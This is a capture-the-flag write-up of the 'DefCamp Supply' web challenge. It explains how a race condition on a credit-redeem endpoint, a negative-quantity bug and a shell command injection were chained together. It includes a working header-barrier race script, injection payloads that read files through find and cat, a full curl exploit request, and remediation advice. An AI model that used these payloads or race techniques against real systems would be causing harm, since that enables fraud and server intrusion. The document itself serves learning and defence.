# DefCamp Supply

**Category:** Web  
**Difficulty:** Medium  
**Author:** 0xAMA  
**Flag:** `CTF{00fd1af2af55ba826af4759fc024770d7ae720622e457b570d16224a8f43b5e2}`

## Challenge Overview

The challenge required chaining three separate bugs:

1. A race condition in `/redeem` allowed the daily two-credit reward to be claimed ten times.
2. A negative order quantity made an order finish immediately while still charging only one billable unit.
3. The premium build profile was inserted into a shell command without safe argument handling, giving command injection.

After racing the balance from 0 to 20 credits, I bought the premium `zero_day_debugger` with a negative quantity and injected a `find` command into its profile. That revealed and printed `/home/ctf/flag.txt`.

```text
CTF{00fd1af2af55ba826af4759fc024770d7ae720622e457b570d16224a8f43b5e2}
```

## Initial reconnaissance

The supplied archive did not contain the complete backend. It included the HTML template, static assets, and—most importantly—the profile verification code.

The shop started every session with zero credits. A user could claim two credits once per day, while the interesting premium product cost 20 credits. Sessions lasted only 30 minutes, so waiting ten days was clearly not an option.

The catalog contained these products:

| Product | Price | Premium |
|---|---:|:---:|
| Terminal Badge | 1 | No |
| Packet Stickers | 3 | No |
| RFID Practice Tags | 5 | No |
| USB Keycap | 6 | No |
| Signal Probe | 4 | No |
| Zero-Day Debugger | 20 | Yes |

The premium item was the only one that let the user choose a custom build profile. That immediately made the supplied backend component interesting.

## Finding the command injection

The relevant code was short:

```python
import subprocess


def verify_custom_profile(profile: str) -> str:
    command = f'python3 verify_profile.py "{profile}"'
    completed = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        timeout=5,
    )
    return (completed.stdout + completed.stderr).strip()
```

The vulnerability is the combination of string interpolation and `shell=True`. The profile is placed between double quotes, but a profile containing `"; ... ;#` closes those quotes, starts a new shell command, and comments out the trailing quote.

For example:

```text
";id;#
```

produces a command resembling:

```sh
python3 verify_profile.py "";id;#"
```

The verifier itself only accepted a small list of normal profiles, but this validation happened *inside* the command that had already been passed to a shell. It therefore did not protect the command boundary.

There were two obstacles before this could be exploited:

- The server rejected the premium item unless the account had at least 20 credits.
- A normal positive quantity left the order queued, delaying the profile verification result.

## Understanding the quantity bug

The client-side JavaScript exposed an important inconsistency:

```javascript
const units = Number.parseInt(unitsInput.value, 10);
const billableUnits = Number.isFinite(units) ? Math.max(units, 1) : 1;
const cost = unitPrice * billableUnits;
```

The server used the same minimum of one billable unit. As a result, a negative quantity did not create a negative cost: it still charged the price of one item.

However, the raw negative quantity was used when calculating the delivery ETA. A sufficiently negative quantity pushed the ETA below zero, so the server treated the order as complete immediately and ran the profile verifier in the checkout request.

A test against a non-premium item confirmed both behaviours:

```json
{
  "balance": 0,
  "cost": 4,
  "eta": -5727,
  "ok": true,
  "result": "profile accepted:standard",
  "status": "done"
}
```

The result also confirmed that non-premium products forcibly replaced the supplied profile with `standard`. The injection therefore had to be used with the 20-credit premium item.

## The credit race

The daily reward endpoint had a classic check-then-update race. Conceptually, its logic behaved like this:

```python
if user_has_claimed_today(user):
    reject()

add_two_credits(user)
mark_today_as_claimed(user)
```

Multiple requests could pass the first check before any one of them marked the reward as claimed. Ten successful requests were enough to reach the required balance:

```text
10 requests × 2 credits = 20 credits
```

### The first race attempt that did not work

My initial race harness opened ten sockets and withheld the final byte of each request body. Once all sockets were ready, it released that final byte at the same time.

That sounds synchronized, but it had a subtle flaw: `/redeem` did not need to read the request body. The application could begin processing a request before the withheld byte arrived. While the script was still opening later sockets, the first requests were already claiming the reward. This produced only a few successful claims and made the server appear to have very limited concurrency.

This was the turning point in the solve. The synchronization barrier had to be placed *before Flask could see the request at all*, not merely somewhere in the request body.

### Synchronizing at the end of the HTTP headers

The corrected harness sent every header except the final CRLF that terminates the header block. An HTTP server cannot dispatch an incomplete header block to the application, so all ten connections remained parked at the same protocol boundary.

Once every socket was ready, the script simultaneously sent:

```text
\r\n + request body
```

Here is the complete race script:

```python
import socket
import threading
import sys


HOST = "35.198.167.105"
PORT = 31686
COUNT = 10


def session_cookie(path: str) -> str:
    with open(path, encoding="utf-8") as source:
        for line in source:
            if (
                not line.startswith("#")
                or line.startswith("#HttpOnly_")
            ) and "\tsession\t" in line:
                return line.rstrip().split("\t")[-1]
    raise RuntimeError("session cookie not found")


cookie = session_cookie(sys.argv[1])
body = b"x=1"
sockets = []

for index in range(COUNT):
    client_ip = f"203.0.113.{index + 1}"
    headers = (
        f"POST /redeem HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Cookie: session={cookie}\r\n"
        f"X-Forwarded-For: {client_ip}\r\n"
        f"X-Real-IP: {client_ip}\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 Chrome/140.0.0.0 Safari/537.36\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n"
    ).encode()

    connection = socket.create_connection((HOST, PORT), timeout=15)
    connection.sendall(headers)
    sockets.append(connection)

barrier = threading.Barrier(COUNT + 1)
responses = [b""] * COUNT


def release(index: int) -> None:
    connection = sockets[index]
    barrier.wait()

    # The first CRLF completes the header terminator. Only now can the
    # request be dispatched to the application.
    connection.sendall(b"\r\n" + body)

    chunks = []
    while True:
        chunk = connection.recv(65536)
        if not chunk:
            break
        chunks.append(chunk)

    responses[index] = b"".join(chunks)
    connection.close()


threads = [
    threading.Thread(target=release, args=(index,))
    for index in range(COUNT)
]

for thread in threads:
    thread.start()

barrier.wait()

for thread in threads:
    thread.join()

for index, response in enumerate(responses):
    status = response.split(b"\r\n", 1)[0].decode(errors="replace")
    payload = response.split(b"\r\n\r\n", 1)[-1].decode(
        errors="replace"
    )
    print(index, status, payload[:200])
```

Before running it, I created a fresh session and saved its cookie:

```sh
curl -sS \
  -c cookies.txt \
  -o index.html \
  http://35.198.167.105:31686/

python3 header_barrier_redeem.py cookies.txt
```

This time all ten claims succeeded. The responses arrived out of order, but their balances showed the complete sequence from 2 through 20 credits:

```text
{"balance":2,"message":"2 credits added.","ok":true}
{"balance":4,"message":"2 credits added.","ok":true}
{"balance":6,"message":"2 credits added.","ok":true}
...
{"balance":18,"message":"2 credits added.","ok":true}
{"balance":20,"message":"2 credits added.","ok":true}
```

This also respected the challenge warning about excessive POST requests: it used exactly the ten requests required by the intended race, rather than repeatedly hammering the endpoint.

## Exploiting the premium profile

With a balance of 20, the remaining chain was straightforward:

- Select `zero_day_debugger`.
- Use a negative quantity so the result is processed immediately.
- Close the profile's quoted argument.
- Run a shell command.
- Comment out the leftover quote.

My first payload checked the most common flag locations and the `FLAG` environment variable:

```text
";cat /flag /flag.txt /app/flag /app/flag.txt 2>/dev/null;printenv FLAG;#
```

The response only contained `profile rejected:`, which showed that the injection ran but none of those guessed paths existed.

Since buying the premium item consumed the entire balance, I created another fresh account and repeated the reliable ten-request race. For the second attempt, I used a bounded filesystem search rather than guessing again:

```text
";pwd;find / -xdev -maxdepth 3 -type f -iname flag\* \
  -print -exec cat {} \; 2>/dev/null;#
```

The final checkout request was equivalent to:

```sh
curl -sS \
  -b cookies.txt \
  --data-urlencode 'item_id=zero_day_debugger' \
  --data-urlencode 'quantity=-1000' \
  --data-urlencode 'profile=";pwd;find / -xdev -maxdepth 3 -type f -iname flag\* -print -exec cat {} \; 2>/dev/null;#' \
  http://35.198.167.105:31686/checkout
```

The application returned the verifier's combined standard output directly in JSON:

```json
{
  "balance": 0,
  "cost": 20,
  "eta": -45004,
  "ok": true,
  "order_id": "f36efe5ffb8c",
  "result": "profile rejected:\n/home/ctf/app\n/home/ctf/flag.txt\nCTF{00fd1af2af55ba826af4759fc024770d7ae720622e457b570d16224a8f43b5e2}",
  "status": "done"
}
```

## Flag

```text
CTF{00fd1af2af55ba826af4759fc024770d7ae720622e457b570d16224a8f43b5e2}
```

## Why the full chain works

No single bug was enough on its own:

- The command injection was locked behind a 20-credit purchase.
- The daily redemption normally provided only two credits.
- The negative quantity did not reduce the premium price, but it did eliminate the delivery delay.
- The race condition supplied the missing credits.

The complete chain was therefore:

```text
header-boundary race
        ↓
10 daily claims land concurrently
        ↓
balance becomes 20
        ↓
premium checkout with quantity = -1000
        ↓
ETA becomes negative, so verification runs immediately
        ↓
profile breaks out of the quoted shell argument
        ↓
/home/ctf/flag.txt is printed in the JSON response
```

## Remediation

### Make redemption atomic

The claim check and balance update must happen in one atomic database operation or transaction. For example, a unique constraint on `(user_id, claim_date)` can make duplicate claims impossible even under concurrency. Insert the claim record first and award credits only if that insert succeeds.

### Do not invoke a shell

The verifier should pass arguments as a list and keep `shell=False`:

```python
completed = subprocess.run(
    ["python3", "verify_profile.py", profile],
    shell=False,
    capture_output=True,
    text=True,
    timeout=5,
)
```

An allowlist should still be applied, but it should be treated as a second layer of validation—not as a substitute for safe process creation.

### Validate quantity consistently

The server should enforce a sensible range such as `1 <= quantity <= 100` before using the value for either billing or ETA calculations. Billing and delivery logic should operate on the same validated quantity.

### Avoid returning raw process output

Returning subprocess output to the client turned command injection directly into data exfiltration. Production responses should expose a small, structured status and keep detailed process output in protected server logs.

## Final thoughts

The most interesting part of this challenge was not spotting `shell=True`; that issue was deliberately visible in the supplied source. The real challenge was reaching the vulnerable code under a short session lifetime and an aggressive request limit.

The failed body-byte race was especially instructive. A race script can look concurrent without actually synchronizing at the boundary that matters. Moving the barrier from the request body to the end of the HTTP headers changed the result from a couple of claims to all ten. Once that detail was correct, the rest of the exploit chain fell neatly into place.
